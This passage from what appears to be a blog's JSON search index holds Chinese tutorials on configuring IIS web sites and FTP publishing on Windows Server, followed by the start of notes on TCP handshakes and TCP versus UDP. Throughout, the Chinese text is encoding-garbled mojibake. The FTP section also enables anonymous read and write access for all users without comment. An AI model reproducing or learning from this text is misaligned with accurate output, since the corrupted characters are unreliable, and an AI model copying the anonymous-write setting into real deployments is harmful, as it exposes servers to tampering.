ä¸­é€‰æ‹©æœåŠ¡å™¨ã€‘ï¼Œå®‰è£…ç¨‹åºä¼šè‡ªåŠ¨æ£€æµ‹ä¸æ˜¾ç¤ºè¿™å°è®¡ç®—æœºé‡‡ç”¨é™æ€IPåœ°å€è®¾ç½®çš„ç½‘ç»œè¿æ¥ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n**iv.**\tåœ¨ã€æœåŠ¡å™¨è§’è‰²ã€‘ä¸­ï¼Œé€‰æ‹©ã€WebæœåŠ¡å™¨ï¼ˆIISï¼‰ã€‘,è‡ªåŠ¨å¼¹å‡ºã€æ·»åŠ WebæœåŠ¡å™¨ï¼ˆIISï¼‰æ‰€éœ€çš„åŠŸèƒ½ã€‘å¯¹è¯æ¡†ï¼Œå•å‡»ã€æ·»åŠ åŠŸèƒ½ã€‘æŒ‰é’®ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n**v.**\tåœ¨è¿™é‡Œé€‰æ‹©éœ€è¦æ·»åŠ çš„åŠŸèƒ½ï¼Œå¦‚æ— ç‰¹æ®Šéœ€æ±‚ï¼Œä¸€èˆ¬é»˜è®¤å³å¯ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n**vi.**\tåœ¨ã€è§’è‰²æœåŠ¡ã€‘ï¼Œå‹¾é€‰æ‰€éœ€çš„WebæœåŠ¡å™¨é‡Œæ‰€éœ€çš„è§’è‰²ï¼ˆé»˜è®¤å³å¯ï¼Œå®‰è£…å®Œæˆåå¯æ›´æ”¹ï¼‰ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®åç»§ç»­å•å‡»ã€å®‰è£…ã€‘æŒ‰é’®ã€‚\n**vii.**\tå•å‡»ã€å…³é—­ã€‘æŒ‰é’®å®Œæˆå®‰è£…ã€‚\n**viii.**\tå›åˆ°ã€æœåŠ¡å™¨ç®¡ç†å™¨ã€‘ï¼Œå¯ä»¥çœ‹åˆ°å·¦ä¾§å¤šäº†ä¸€é¡¹ã€IISã€‘ï¼Œå•å‡»ã€å·¥å…·ã€‘â†’ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œå³å¯å¯¹IISè¿›è¡Œé…ç½®ã€ç®¡ç†ã€‚ \n<img src=\"https://i.loli.net/2020/03/21/FwbWQYpiOkvP91d.png\"/>\n\n### 2.åˆ›å»ºWebç«™ç‚¹å¹¶å®ç°å¤–ç½‘è®¿é—®\n\n**i.**\tå°†ç½‘ç«™æ”¾ç½®åœ¨â€œCï¼š\\jwt-websiteâ€ç›®å½•ä¸­ï¼Œç½‘ç«™çš„é¦–é¡µä¸ºâ€œhomepage.htmlâ€ ã€‚\n![](https://i.loli.net/2020/03/21/g29w3rZ7oi14WnD.png)\n**ii.**\tæ‰“å¼€ã€æœåŠ¡å™¨ç®¡ç†ã€‘ï¼Œå•å‡»ã€å·¥å…·ã€‘â†’ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œå³å¯è¿›å…¥ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ä¸»çª—å£ã€‚\n\n**iii.**\tå±•å¼€å·¦ä¾§ç½‘ç«™åˆ—è¡¨ï¼Œå•å‡»ã€Default Web Siteã€‘ç«™ç‚¹ï¼Œå†å³é”®èœå•ä¸­é€‰æ‹©ã€ç®¡ç†ç½‘ç«™ã€‘ï¼Œå•å‡»ã€åœæ­¢ã€‘æŒ‰é’®ã€‚\n<img src=\"https://i.loli.net/2020/03/21/yrehZv8C9QFuwg6.png\"/>\n**iv.**\tåœ¨å·¦ä¾§ã€ç½‘ç«™ã€‘ï¼Œå•å‡»å³é”®ï¼Œå•å‡»ã€æ·»åŠ ç½‘ç«™ã€‘é“¾æ¥æ¥æ·»åŠ ç½‘ç«™ã€‚\n**v.**\tåœ¨ã€æ·»åŠ ç½‘ç«™ã€‘å¯¹è¯æ¡†ä¸­ï¼Œè®¾ç½®ç½‘ç«™åç§°ã€ç‰©ç†è·¯å¾„ã€IPåœ°å€ï¼Œå…¶ä»–é»˜è®¤è®¾ç½®ï¼Œå•å‡»ã€ç¡®å®šã€‘æŒ‰é’®å®Œæˆç½‘ç«™åˆ›å»ºã€‚<img src=\"https://i.loli.net/2020/03/21/W4SG2RHsrPoAcNa.png\"/>\n\n**vi.**\tåœ¨IISç®¡ç†å™¨é€‰ä¸­ã€ç®€ç®€ç½‘ç«™ã€‘ï¼ŒåŒå‡»ã€é»˜è®¤æ–‡æ¡£ã€‘ã€‚\n**vii.**\tåœ¨é»˜è®¤æ–‡æ¡£ä¸­ï¼Œå•å‡»ã€æ·»åŠ ã€‘æŒ‰é’®ï¼Œåœ¨åç§°ä¸­è¾“å…¥å­˜åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™é¦–é¡µæ–‡ä»¶ï¼ˆå¦‚ï¼šhomepage.htmlï¼‰ã€‚\n![](https://i.loli.net/2020/03/21/f2C4Bk7G8LdSzRH.png)\n\n**viii.**\tåœ¨IISç®¡ç†å™¨å•å‡»å³ä¾§ã€æµè§ˆç½‘ç«™ã€‘ï¼Œæˆ–è€…æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨åœ°å€æ è¾“å…¥ã€http://172.18.176.138ã€‘,å³å¯åœ¨æœ¬æœºæ­£å¸¸æµè§ˆè¯¥ç½‘ç«™ã€‚\n<img src=\"https://i.loli.net/2020/03/21/PC9E5stTDR3z8h1.png\"/>\n\n\n\n### 3.å®¢æˆ·ç«¯è®¿é—®Webç«™ç‚¹\n\n**ç°åœ¨å†…ç½‘è®¿é—®ç½‘ç«™å·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼Œä¸‹é¢è¿›è¡Œå¤–ç½‘è®¿é—®çš„è®¾ç½®**\n\nå¤–ç½‘è®¿é—®éœ€è¦é˜¿é‡Œäº‘æ‰“å¼€80ç«¯å£çš„è®¿é—®æƒé™ï¼Œå…·ä½“æ“ä½œ`ç™»é™†é˜¿é‡Œäº‘--å®ä¾‹- -ç®¡ç†--æœ¬å®ä¾‹å®‰å…¨ç»„--é…ç½®è§„åˆ™`\n\nç‚¹å‡»`æ·»åŠ å®‰å…¨ç»„è§„åˆ™`ï¼Œç„¶åæŒ‰ä¸‹å›¾å¡«å†™è§„åˆ™ï¼Œç„¶åç‚¹å‡»ç¡®å®š\n<img src=\"https://i.loli.net/2020/03/21/8KGTrOkWwxC5b96.png\"/>\nè¾“å…¥é˜¿é‡Œäº‘åˆ†é…çš„å…¬ç½‘IPï¼Œæˆ‘çš„å…¬ç½‘IPä¸º`47.107.236.250`ï¼Œç„¶åå°±å¯ä»¥happyçš„è®¿é—®æˆ‘ä»¬çš„ç½‘é¡µå•¦ï¼\n<img src=\"https://i.loli.net/2020/03/21/swA8DcZnielCqrM.png\"/>\n\nå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/u014453443/article/details/84942670\n\n### 4.åŸºäºIPåœ°å€çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\n\ni.\tæ‰“å¼€ã€ç½‘ç»œå…±äº«ä¸­å¿ƒã€‘ï¼Œå•å‡»ã€ä»¥å¤ªç½‘å¡ã€‘ï¼Œæ‰¾åˆ°ã€Internetåè®®ç‰ˆæœ¬ï¼ˆTCP/IPv4ï¼‰ã€‘ï¼Œå•å‡»ã€é«˜çº§ã€‘æŒ‰é’®ï¼Œå•å‡»ã€æ·»åŠ ã€‘æŒ‰é’®ï¼Œè¿›è¡ŒIPåœ°æ·»åŠ ï¼Œæ·»åŠ å®Œæˆå¯æŸ¥çœ‹ã€ç½‘ç»œè¿æ¥è¯¦ç»†ä¿¡æ¯ã€‘\n\nii.\tåœ¨Cç›˜ä¸‹åˆ›å»ºWGSç›®å½•ï¼Œå¹¶åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸‰ä¸ªç›®å½•WGS-IP-1ã€WGS-IP-2ã€WGS-IP-3ï¼Œå¹¶åœ¨æ¯ä¸ªç›®å½•ä¸­åˆ†åˆ«åˆ›å»ºfirst.htmlã€second.htmlã€third.htmlæ–‡ä»¶ã€‚\n\niii.\tæ‰“å¼€ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œåœ¨å·¦ä¾§ã€ç½‘ç«™ã€‘ï¼Œå•å‡»å³é”®ï¼Œå•å‡»ã€æ·»åŠ ç½‘ç«™ã€‘é“¾æ¥æ¥æ·»åŠ ç½‘ç«™ã€‚\niv.\tåœ¨ã€æ·»åŠ ç½‘ç«™ã€‘å¯¹è¯æ¡†ä¸­ï¼Œåœ¨ã€ç½‘ç«™åç§°ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥WGS-IP-1ï¼Œåœ¨ã€ç‰©ç†è·¯å¾„ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥C:\\WGS\\WGS-IP-1ï¼Œåœ¨ã€IPåœ°å€ã€‘æ–‡æœ¬æ¡†ä¸­é€‰æ‹©10.6.64.8ï¼Œå•å‡»ã€ç¡®å®šã€‘æŒ‰é’®å®Œæˆç½‘ç«™åˆ›å»ºã€‚\n\nv.\té€šè¿‡é€‰æ‹©ä¸åŒIPåœ°å€ï¼Œå¯ä»¥åˆ›å»ºä¸åŒçš„IPçš„ç½‘ç«™ï¼Œç”¨åŒæ ·çš„æ–¹æ³•ï¼Œé…ç½®åŸºäº10.6.64.9å’Œ10.6.64.10çš„ç½‘ç«™ã€‚\n\nvi.\tåœ¨å®¢æˆ·ç«¯æµè§ˆå™¨åœ°å€æ åˆ†åˆ«è¾“å…¥ IPåœ°å€ï¼š10.6.64.8ã€10.6.64.9ã€10.6.64.10ï¼Œéƒ½å¯ä»¥æ­£å¸¸è®¿é—®ã€‚\n### 5.åŸºäºä¸»æœºåçš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\n\ni.\tå®‰è£…DNSæœåŠ¡å™¨ï¼Œå¹¶åœ¨DNSæœåŠ¡å™¨åˆ›å»ºä¸åŒä¸»æœºåçš„åŸŸå:www1.wgs.comã€www2.wgs.comã€www3.wgs.comï¼Œå¹¶è§£æåˆ°10.6.64.8ã€‚\nii.\tåœ¨Cç›˜ä¸‹åˆ›å»ºWGSç›®å½•ï¼Œå¹¶åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸‰ä¸ªç›®å½•WGS-DNS-1ã€WGS-DNS-2ã€WGS-DNS-3ï¼Œå¹¶åœ¨æ¯ä¸ªç›®å½•ä¸­åˆ†åˆ«åˆ›å»ºfirst.htmlã€second.htmlã€third.htmlæ–‡ä»¶ã€‚\n\niii.\tæ‰“å¼€ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œåœ¨å·¦ä¾§ã€ç½‘ç«™ã€‘ï¼Œå•å‡»å³é”®ï¼Œå•å‡»ã€æ·»åŠ ç½‘ç«™ã€‘é“¾æ¥æ¥æ·»åŠ ç½‘ç«™ã€‚\niv.\tåœ¨ã€æ·»åŠ ç½‘ç«™ã€‘å¯¹è¯æ¡†ä¸­ï¼Œåœ¨ã€ç½‘ç«™åç§°ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥WGS-DNS-1ï¼Œåœ¨ã€ç‰©ç†è·¯å¾„ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥C:\\WGS\\WGS-DNS-1ï¼Œåœ¨ã€ä¸»æœºåã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥www1.wgs.comï¼Œå•å‡»ã€ç¡®å®šã€‘æŒ‰é’®å®Œæˆç½‘ç«™åˆ›å»ºã€‚\n\nv.\té€šè¿‡é€‰æ‹©ä¸åŒçš„ä¸»æœºåï¼Œå¯ä»¥åˆ›å»ºä¸åŒä¸»æœºåçš„ç½‘ç«™ï¼Œç”¨åŒæ ·çš„æ–¹æ³•ï¼Œé…ç½®åŸºäºwww2.wgs.comå’Œwww3.wgs.comçš„ç½‘ç«™ã€‚\n\nvi.\tåœ¨å®¢æˆ·ç«¯æµè§ˆå™¨åœ°å€æ åˆ†åˆ«è¾“å…¥ä¸åŒä¸»æœºåçš„åŸŸåï¼šwww1.wgs.comã€www2.wgs.comã€www3.wgs.comï¼Œéƒ½å¯ä»¥æ­£å¸¸è®¿é—®ã€‚\n\n### 6.åŸºäºç«¯å£å·çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\n\ni.\tåœ¨Cç›˜ä¸‹åˆ›å»ºWGSç›®å½•ï¼Œå¹¶åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸‰ä¸ªç›®å½•WGS-PORT-1ã€WGS-PORT-2ã€WGS-PORT-3ï¼Œå¹¶åœ¨æ¯ä¸ªç›®å½•ä¸­åˆ†åˆ«åˆ›å»ºfirst.htmlã€second.htmlã€third.htmlæ–‡ä»¶ï¼Œå¦‚å›¾6-45æ‰€ç¤ºã€‚\nii.\tæ‰“å¼€ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œåœ¨å·¦ä¾§ã€ç½‘ç«™ã€‘ï¼Œå•å‡»å³é”®ï¼Œå•å‡»ã€æ·»åŠ ç½‘ç«™ã€‘é“¾æ¥æ¥æ·»åŠ ç½‘ç«™ã€‚\niii.\tåœ¨ã€æ·»åŠ ç½‘ç«™ã€‘å¯¹è¯æ¡†ä¸­ï¼Œåœ¨ã€ç½‘ç«™åç§°ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥WGS-PORT-1ï¼Œåœ¨ã€ç‰©ç†è·¯å¾„ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥C:\\WGS\\WGS- PORT -1ï¼Œåœ¨ã€ç«¯å£ã€‘æ–‡æœ¬æ¡†ä¸­è¾“å…¥8081ï¼Œå•å‡»ã€ç¡®å®šã€‘æŒ‰é’®å®Œæˆç½‘ç«™åˆ›å»ºã€‚\n\niv.\té€šè¿‡é€‰æ‹©ä¸åŒç«¯å£ï¼Œå¯ä»¥åˆ›å»ºä¸åŒç«¯å£çš„ç½‘ç«™ï¼Œç”¨åŒæ ·çš„æ–¹æ³•ï¼Œé…ç½®åŸºäºç«¯å£ï¼š8082å’Œç«¯å£ï¼š8083çš„ç½‘ç«™ã€‚\n\nv.\tåœ¨å®¢æˆ·ç«¯æµè§ˆå™¨åœ°å€æ åˆ†åˆ«è¾“å…¥åŸŸååŠ ç«¯å£ï¼šwww.wgs.com:8081ã€www.wgs.com:8082ã€www.wgs.com:8083ï¼Œéƒ½å¯ä»¥æ­£å¸¸è®¿é—®ã€‚\n\n### 7.åŸºäºè™šæ‹Ÿç›®å½•çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\n\ni.\tåœ¨Cç›˜ä¸‹åˆ›å»ºäº”æ¡‚å±±å…¬å¸ç½‘ç«™çš„ç›®å½•ï¼Œå¹¶åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸¤ä¸ªç›®å½•CWã€RSï¼Œå¹¶åœ¨æ¯ä¸ªç›®å½•ä¸­åˆ†åˆ«åˆ›å»ºfirst.htmlã€second.htmlæ–‡ä»¶ã€‚\n\nii.\tæ‰“å¼€ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œæ‰¾åˆ°äº”æ¡‚å±±å…¬å¸ç½‘ç«™ï¼Œåœ¨å³é”®èœå•ä¸­é€‰æ‹©ã€æ·»åŠ è™šæ‹Ÿç›®å½•ã€‘ã€‚\niii.\tåœ¨ã€æ·»åŠ è™šæ‹Ÿç›®å½•ã€‘å¯¹è¯æ¡†ä¸­ï¼Œåœ¨ã€åˆ«åã€‘è¾“å…¥CWï¼Œã€ç‰©ç†è·¯å¾„ã€‘è¾“å…¥C:\\äº”æ¡‚å±±å…¬å¸ç½‘ç«™\\CWï¼Œå•å‡»ã€ç¡®å®šã€‘æŒ‰é’®ã€‚\n\niv.\tä½¿ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œé…ç½®è™šæ‹Ÿç›®å½•çš„ç½‘ç«™ï¼Œç‰©ç†è·¯å¾„ï¼šC:\\äº”æ¡‚å±±å…¬å¸ç½‘ç«™\\RSã€‚\n\nv.\tåœ¨å®¢æˆ·ç«¯æµè§ˆå™¨åœ°å€æ åˆ†åˆ«è¾“å…¥åŸŸåè™šæ‹Ÿç›®å½•ï¼šwww.wgs.com/CWã€www.wgs.com/RSï¼Œéƒ½å¯ä»¥æ­£å¸¸è®¿é—®ã€‚\n\n### 8.é€šè¿‡FTPæ›´æ–°Webç«™ç‚¹\n\ni.\tæ‰“å¼€ã€Internetä¿¡æ¯æœåŠ¡ï¼ˆIISï¼‰ç®¡ç†å™¨ã€‘ï¼Œæ‰¾åˆ°ã€ç½‘ç»œç¼–è¾‘éƒ¨ã€‘ç½‘ç«™ï¼Œåœ¨å³é”®èœå•ä¸­å•å‡»ã€æ·»åŠ FTPå‘å¸ƒã€‘æŒ‰é’®ã€‚\nii.\tæ‰“å¼€ã€ç»‘å®šå’ŒSSLè®¾ç½®ã€‘çª—å£ï¼Œåœ¨ã€IPåœ°å€ã€‘è¾“å…¥10.6.64.8ï¼Œåœ¨ã€SSLã€‘é€‰æ‹©æ— SSL,å•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n\niii.\tåœ¨ã€èº«ä»½éªŒè¯å’Œæˆæƒä¿¡æ¯ã€‘ä¸­ï¼Œé€‰ä¸­ã€åŒ¿åã€‘ã€ã€è¯»å–ã€‘ã€ã€å†™å…¥ã€‘å¤é€‰æ¡†ï¼Œåœ¨ã€å…è®¸è®¿é—®ã€‘é€‰æ‹©ã€æ‰€æœ‰ç”¨æˆ·ã€‘ï¼Œå•å‡»ã€å®Œæˆã€‘æŒ‰é’®ã€‚\n\niv.\tåœ¨å®¢æˆ·ç«¯ä½¿ç”¨FTPå®¢æˆ·ç«¯æ›´æ–°å‰è®¿é—®ç½‘ç»œç¼–è¾‘éƒ¨çš„ç½‘ç«™ã€http://web.wgs.comã€‘ã€‚\n\nv.\tåœ¨å®¢æˆ·ç«¯ä¸Šç”¨FTPå®¢æˆ·ç«¯è½¯ä»¶ï¼ˆFlashFXPï¼‰ç™»å½•FTPæœåŠ¡å™¨ï¼Œæ­¤æ—¶ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å’Œåˆ é™¤ç½‘ç«™æ–‡ä»¶ï¼Œå®ç°äº†ç½‘ç«™çš„æ›´æ–°ã€‚\n\nvi.\tåœ¨å®¢æˆ·ç«¯ä½¿ç”¨FTPå®¢æˆ·ç«¯æ›´æ–°åè®¿é—®ç½‘ç»œç¼–è¾‘éƒ¨çš„ç½‘ç«™ã€http://web.wgs.comã€‘ã€‚ ","tags":["WindowsæœåŠ¡å™¨é…ç½®ä¸ç®¡ç†","WebæœåŠ¡å™¨"],"categories":["Course"]},{"title":"è®¡ç½‘ & OS","url":"/posts/31060.html","content":"\n# è®¡ç½‘\n\n## â‘ ç½‘ç»œåˆ†å±‚\n\n![](https://img.jwt1399.top/img/202211141240937.png)\n\n## â‘¡TCP\n\n### â¶ä¸‰æ¬¡æ¡æ‰‹\n\n![](https://img.jwt1399.top/img/202210271335204.png)\n\n1.  **ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼š**å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·å»ºç«‹è¿æ¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯ä¼šéšæœºç”Ÿæˆä¸€ä¸ªèµ·å§‹åºåˆ—å·xï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€æ•°æ®åŒ…ï¼ˆåŒ…å«æ ‡å¿—ä½`SYN=1`ï¼Œåºåˆ—å·`seq=x`ï¼‰ã€‚\n    - ç¬¬ä¸€æ¬¡æ¡æ‰‹å‰å®¢æˆ·ç«¯çš„çŠ¶æ€ä¸º`CLOSE`ï¼Œç¬¬ä¸€æ¬¡æ¡æ‰‹åå®¢æˆ·ç«¯çš„çŠ¶æ€ä¸º`SYN-SEND`ã€‚æ­¤æ—¶æœåŠ¡ç«¯çš„çŠ¶æ€ä¸º`LISTEN`ã€‚\n2.  **ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼š**æœåŠ¡ç«¯åœ¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„æŠ¥æ–‡åï¼Œä¼šéšæœºç”Ÿæˆä¸€ä¸ªæœåŠ¡ç«¯çš„èµ·å§‹åºåˆ—å·yï¼Œç„¶åç»™å®¢æˆ·ç«¯å›å¤ä¸€æ®µæŠ¥æ–‡ï¼ˆåŒ…æ‹¬æ ‡å¿—ä½`SYN=1`ï¼Œ`ACK=1`ï¼Œåºåˆ—å·`seq=y`ï¼Œç¡®è®¤å·`ack=x+1`ï¼‰ã€‚ï¼ˆå…¶ä¸­`SYN=1`è¡¨ç¤ºè¦å’Œå®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œ`ACK=1`è¡¨ç¤ºç¡®è®¤åºå·æœ‰æ•ˆï¼‰\n    - ç¬¬äºŒæ¬¡æ¡æ‰‹å‰æœåŠ¡ç«¯çš„çŠ¶æ€ä¸º`LISTEN`ï¼Œç¬¬äºŒæ¬¡æ¡æ‰‹åæœåŠ¡ç«¯çš„çŠ¶æ€ä¸º`SYN-RCVD`ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯çš„çŠ¶æ€ä¸º`SYN-SENT`ã€‚\n3.  **ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼š**å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯å‘æ¥çš„æŠ¥æ–‡åï¼Œä¼šå†å‘æœåŠ¡ç«¯å‘é€æŠ¥æ–‡ï¼ˆåŒ…å«æ ‡å¿—ä½`ACK=1`ï¼Œåºåˆ—å·`seq=x+1`ï¼Œç¡®è®¤å·`ack=y+1`ï¼‰ã€‚\n    - ç¬¬ä¸‰æ¬¡æ¡æ‰‹å‰å®¢æˆ·ç«¯çš„çŠ¶æ€ä¸º`SYN-SENT`ï¼Œç¬¬ä¸‰æ¬¡æ¡æ‰‹åå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„çŠ¶æ€éƒ½ä¸º`ESTABLISHED`ã€‚**æ­¤æ—¶è¿æ¥å»ºç«‹å®Œæˆï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å°±å¯ä»¥ä¼ è¾“æ•°æ®å•¦ã€‚**\n\nå‚è€ƒï¼š[ç¨‹åºå‘˜å¤§å½¬ (topjavaer.cn)](http://topjavaer.cn/computer-basic/network.html#ä¸‰æ¬¡æ¡æ‰‹)\n\n### â·ä¸ºä»€ä¹ˆè¦ä¸‰æ¬¡æ¡æ‰‹?\n\n> ä¸¤æ¬¡æ¡æ‰‹å¯ä»¥å—ï¼Ÿ\n\nä¸‰æ¬¡æ¡æ‰‹çš„ç›®çš„æ˜¯å»ºç«‹å¯é çš„é€šä¿¡ä¿¡é“ï¼Œå³åŒæ–¹ç¡®è®¤è‡ªå·±ä¸å¯¹æ–¹çš„å‘é€ä¸æ¥æ”¶æ˜¯å¦æ­£å¸¸ã€‚\n\n|                |                 Client                 |                 Server                 |\n| -------------- | :------------------------------------: | :------------------------------------: |\n| **ç¬¬ä¸€æ¬¡æ¡æ‰‹** |             ä»€ä¹ˆéƒ½ä¸èƒ½ç¡®è®¤             |       å¯¹æ–¹å‘é€æ­£å¸¸ï¼Œè‡ªå·±æ¥æ”¶æ­£å¸¸       |\n| **ç¬¬äºŒæ¬¡æ¡æ‰‹** | è‡ªå·±å‘é€ã€æ¥æ”¶æ­£å¸¸ï¼›å¯¹æ–¹å‘é€ã€æ¥æ”¶æ­£å¸¸ |       å¯¹æ–¹å‘é€æ­£å¸¸ï¼Œè‡ªå·±æ¥æ”¶æ­£å¸¸       |\n| **ç¬¬ä¸‰æ¬¡æ¡æ‰‹** | è‡ªå·±å‘é€ã€æ¥æ”¶æ­£å¸¸ï¼›å¯¹æ–¹å‘é€ã€æ¥æ”¶æ­£å¸¸ | è‡ªå·±å‘é€ã€æ¥æ”¶æ­£å¸¸ï¼Œå¯¹æ–¹å‘é€ã€æ¥æ”¶æ­£å¸¸ |\n\nä¸¤æ¬¡æ¡æ‰‹çš„è¯æœåŠ¡ç«¯æ— æ³•ç¡®è®¤è‡ªå·±å‘é€å’Œå¯¹æ–¹æ¥æ”¶æ˜¯å¦æ­£å¸¸ï¼Œä¸‰æ¬¡æ¡æ‰‹å°±èƒ½ç¡®è®¤åŒå‘æ”¶å‘åŠŸèƒ½éƒ½æ­£å¸¸ï¼Œç¼ºä¸€ä¸å¯ã€‚\n\nå³ç¬¬ä¸‰æ¬¡æ¡æ‰‹**é˜²æ­¢äº†å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µ**çªç„¶åˆä¼ è¾“åˆ°äº†æœåŠ¡ç«¯ã€‚\n\n### â¸å››æ¬¡æŒ¥æ‰‹\n\n![](https://img.jwt1399.top/img/202211141240210.png)\n\n1.  **ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼š**å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µï¼ˆ`FIN=1ï¼Œseq=u`ï¼‰ï¼Œè¿›å…¥`FIN-WAIT-1`ï¼ˆç»ˆæ­¢ç­‰å¾…1ï¼‰çŠ¶æ€ã€‚\n2.  **ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼š**æœåŠ¡ç«¯æ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µåå‘å‡ºç¡®è®¤æŠ¥æ–‡æ®µï¼ˆ`ACK=1ï¼Œack=u+1ï¼Œseq=v`ï¼‰ï¼ŒæœåŠ¡ç«¯è¿›å…¥`CLOSE-WAIT`ï¼ˆå…³é—­ç­‰å¾…ï¼‰çŠ¶æ€ï¼Œå®¢æˆ·ç«¯è¿›å…¥`FIN-WAIT-2`ï¼ˆç»ˆæ­¢ç­‰å¾…2ï¼‰çŠ¶æ€ï¼Œæ­¤æ—¶çš„TCPå¤„äºåŠå…³é—­çŠ¶æ€ï¼Œå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¿æ¥é‡Šæ”¾ã€‚\n3.  **ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼š**æœåŠ¡ç«¯å‘é€å®Œæ•°æ®ï¼Œå°±ä¼šå‘å‡ºè¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µï¼ˆ`FIN=1ï¼ŒACK=1ï¼Œseq=wï¼Œack=u+1`ï¼‰ï¼ŒæœåŠ¡ç«¯è¿›å…¥`LAST-ACK`ï¼ˆæœ€åç¡®è®¤ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ç¡®è®¤ã€‚\n4.  **ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼š**å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µåï¼Œå‘å‡ºç¡®è®¤æŠ¥æ–‡æ®µï¼ˆ`ACK=1ï¼Œseq=u+1ï¼Œack=w+1`ï¼‰ï¼Œå®¢æˆ·ç«¯è¿›å…¥`TIME-WAIT`ï¼ˆæ—¶é—´ç­‰å¾…ï¼‰çŠ¶æ€ã€‚æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯å‘å‡ºçš„ç¡®è®¤æŠ¥æ–‡æ®µåå…³é—­è¿æ¥ï¼Œè¿›å…¥`CLOSED`çŠ¶æ€ã€‚å¦‚æœå®¢æˆ·ç«¯ç­‰å¾… `2MSL`ï¼ˆæœ€å¤§æŠ¥æ–‡æ®µç”Ÿå­˜æ—¶é—´ï¼‰ åä¾ç„¶æ²¡æœ‰æ”¶åˆ°å›å¤ï¼Œå°±è¯æ˜æœåŠ¡ç«¯å·²æ­£å¸¸å…³é—­ï¼Œå®¢æˆ·ç«¯æ‰è¿›å…¥`CLOSED`çŠ¶æ€ã€‚\n\n### â¹TCP ä¸ UDP çš„åŒºåˆ«\n\n-   **æ˜¯å¦é¢å‘è¿æ¥** ï¼š\n    -   UDPæ˜¯æ— è¿æ¥çš„ï¼Œåœ¨ä¼ é€æ•°æ®ä¹‹å‰ä¸éœ€è¦å…ˆå»ºç«‹è¿æ¥ã€‚\n    -   TCP é¢å‘è¿æ¥ï¼Œåœ¨ä¼ é€æ•°æ®ä¹‹å‰å¿…é¡»å…ˆå»ºç«‹è¿æ¥ï¼Œæ•°æ®ä¼ é€ç»“æŸåè¦é‡Šæ”¾è¿æ¥ã€‚\n-   **æ˜¯å¦æ˜¯å¯é ä¼ è¾“**ï¼š\n    -   ä¸»æœºæ”¶åˆ° UDP æŠ¥æ–‡åï¼Œä¸éœ€è¦ç»™å‡ºä»»ä½•ç¡®è®¤ï¼Œå¹¶ä¸”ä¸ä¿è¯æ•°æ®ä¸ä¸¢å¤±ï¼Œä¸ä¿è¯æ˜¯å¦é¡ºåºåˆ°è¾¾ã€‚\n    -   TCP æä¾›å¯é çš„ä¼ è¾“æœåŠ¡ï¼ŒTCP åœ¨ä¼ 